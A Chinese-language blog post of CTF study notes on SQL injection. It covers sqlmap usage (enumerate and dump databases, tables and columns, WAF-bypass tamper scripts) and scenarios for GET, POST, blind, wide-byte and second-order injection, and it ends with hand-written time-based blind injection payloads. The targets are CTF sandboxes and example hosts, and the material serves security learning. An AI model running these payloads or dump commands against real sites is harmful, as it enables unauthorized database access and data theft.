---
title: SQL注入
date: 2025-11-15 20:53:26
tags:
index_img: https://pic1.imgdb.cn/item/69189f3e3203f7be000915ab.png
categories: CTF
---

## 一、SQL 注入基础


**核心原理**：用户输入未经过滤直接拼接到 SQL 语句中，导致恶意代码被执行。  

**CTF 常见注入类型**：

- **联合查询注入（UNION）**
- **布尔盲注**
- **时间盲注**
- **报错注入**
- **堆叠查询注入**
- **宽字节注入**
- **二次注入**

**常见注入点**

- **GET 参数**：`http://example.com/page.php?id=1`
- **POST 参数**：登录框、搜索框、留言板等表单提交的参数。
- **Cookie**：`Cookie: user=admin; session=abc123`
- **HTTP 头部**：`User-Agent`, `Referer`, `X-Forwarded-For` 等。



## 二、SQLmap 自动注入快速上手



####  关键参数说明

|参数|作用|
|---|---|
|`-u`|指定目标 URL|
|`-r`|加载 HTTP 请求文件（Burp 抓包保存为 `.txt`）|
|`-p`|指定测试的参数（如 `id`、`username`）|
|`--dbs`|列出所有数据库|
|`-D <db>`|指定数据库|
|`--tables`|列出指定数据库的所有表|
|`-T <table>`|指定表|
|`--columns`|列出指定表的所有字段|
|`-C <columns>`|指定字段（多个用逗号分隔）|
|`--dump`|导出指定字段的数据|
|`--current-db`|获取当前数据库名|
|`--current-user`|获取当前数据库用户|
|`--technique`|指定注入技术（如 `B` 布尔盲注，`T` 时间盲注，`U` 联合查询）|
|`--time-sec`|时间盲注时的延迟时间（默认 5 秒）|
|`--tamper`|使用脚本绕过 WAF（如 `space2comment` 替换空格为注释）|
|`--threads`|多线程（默认 1，CTF 中建议 1-5 避免触发防护）|

```shell
python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 --current-db

python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables

python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns

python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dump
```

依次为查询最近使用的数据库，查询表，查询字段，转存数据



### 常见场景

#### 场景 1：GET 参数注入



**示例 URL**：`http://ctf.example.com/web1/?id=1`  

**操作流程**：

1. **检测注入点**：

    ```Bash
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1"
    ```

2. **获取数据库**：

    ```Bash
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1" --dbs
    ```

3. **获取表和字段**：

    ```Bash
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1" -D ctf_db --tables
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1" -D ctf_db -T flag --columns
    ```

4. **导出数据**：

    ```Bash
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1" -D ctf_db -T flag -C flag --dump
    ```



#### 场景 2：POST 表单注入



**示例**：登录表单（`username` 和 `password` 参数）  

**操作流程**：

1. **Burp 抓包并保存为** **`request.txt`**：

    ```HTTP
    POST /login.php HTTP/1.1
    Host: ctf.example.com
    Content-Length: 31
    
    username=admin&password=123456
    ```

2. **SQLmap 检测**：

    ```Bash
    python sqlmap.py -r request.txt -p username  # 指定测试 username 参数
    ```

3. **后续操作同 GET 注入**：

    ```Bash
    python sqlmap.py -r request.txt -p username --dbs
    # ... 导出 flag
    ```



#### 场景 3：布尔盲注（无回显）



**特征**：页面无报错，仅根据输入返回“正常”或“异常”（如登录成功/失败）  

**操作流程**：

```Bash
# 指定布尔盲注技术
python sqlmap.py -r request.txt -p username --technique B --dbs
# 导出数据（较慢，耐心等待）
python sqlmap.py -r request.txt -p username -D ctf_db -T flag -C flag --dump
```



#### 场景 4：时间盲注（无回显）



**特征**：页面无任何差异，需通过响应时间判断  

**操作流程**：

```Bash
# 指定时间盲注技术，设置延迟 3 秒
python sqlmap.py -r request.txt -p username --technique T --time-sec 3 --dbs
# 导出数据（非常慢，可适当调大 threads）
python sqlmap.py -r request.txt -p username -D ctf_db -T flag -C flag --dump --threads 3
```



#### 场景 5：宽字节注入（GBK 编码）



**特征**：后端使用 `addslashes()` 或 `mysql_real_escape_string()` 过滤，但数据库为 GBK 编码  

**操作流程**：

```Bash
# 使用 tamper 脚本绕过
python sqlmap.py -u "http://ctf.example.com/web5/?id=1" --tamper=gbkencode --dbs
```



#### 场景 6：二次注入



**特征**：注入点不在初始输入，而在后续读取存储数据时触发（如注册用户名后登录）  

**操作流程**：

1. **注册恶意用户名**：`admin' --`  

2. **Burp 抓包登录请求并保存为 ** **`login.txt`**  

3. **SQLmap 检测登录请求中的 ** **`username`** ** 参数**：

    ```Bash
    python sqlmap.py -r login.txt -p username --dbs
    ```



### 参考文献

[sqlmap常用命令整理](https://blog.csdn.net/qq_44005305/article/details/146025669)

## 三、SQL语法

在 SQL 中，`SHOW COLUMNS FROM flag` 语句用于显示名为 `flag` 的表中各列的详细信息。它返回的结果通常是一个结果集，每行代表表中的一列，各列提供了关于该列的不同元数据信息。常见的格式如下：

**列名**：显示各列信息的标题。通常包含以下常见列：

- **Field**：列的名称。这是表中定义的列标识符。例如，如果表中有一个存储用户名的列，这里会显示相应的列名，如 `username`。
- **Type**：列的数据类型。表明该列可以存储的数据类型，如 `INT`（整数类型）、`VARCHAR(255)`（可变长度字符串，最大长度为 255）、`DATE`（日期类型）等。
- **Null**：表示该列是否允许存储 `NULL` 值。如果显示 `YES`，则该列可以接受 `NULL`；如果显示 `NO`，则不允许。
- **Key**：显示该列是否被定义为键（如主键 `PRI`、唯一键 `UNI` 等）。如果是主键列，这里会显示 `PRI`。
- **Default**：列的默认值。如果在创建表时为该列设置了默认值，这里会显示出来。例如，若某列默认值为 `0`，则会在此处显示 `0`。如果没有设置默认值，可能显示为 `NULL` 或空白（具体取决于数据库系统）。
- **Extra**：提供关于该列的额外信息。例如，对于自增长列，这里可能显示 `auto_increment`。



#### 过滤空格

用`/**/` 代替



## 四、手工注入

[这可能是最全的SQL注入总结，不来看看吗](https://cloud.tencent.com/developer/article/1539207)

#### 整数型注入

[整数型SQL注入](https://blog.csdn.net/qq_69100706/article/details/140707246)

[SQL注入——整数型注入、报错注入](https://blog.51cto.com/m0re/3867378)

#### 时间盲注

##### string 模块的常用常量

| 常量名                   | 含义                               | 示例值                                               |
| ------------------------ | ---------------------------------- | ---------------------------------------------------- |
| `string.ascii_lowercase` | 26 个小写英文字母                  | abcdefghijklmnopqrstuvwxyz                           |
| `string.ascii_uppercase` | 所有大写英文字母                   | ABCDEFGHIJKLMNOPQRSTUVWXYZ                           |
| `string.digits`          | 所有数字                           | 0123456789                                           |
| `string.ascii_letters`   | 所有大小写英文字母（结合上面两个） | abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ |
| `string.punctuation`     | 所有标点符号                       | !"#$%&'()*+,-./:;<=>?@[]^_`{}~                       |

**获取数据库长度**

> ?id=1 and if(length(database())=4,sleep(5),1) --+

**获取数据库名**

> ?id=1 and if(substr(database(),1,1)='s',sleep(5),1) --+

**获取表名**

> ?id=1 and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',sleep(5),1)--+

**获取列名**

> ?id=1 and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='sqli'),1,1)='a',sleep(5),1)--+

**获取数据**

> ?id=1 and if(substr((select group_concat(flag) from flag),1,1)='a',sleep(5),1)--+
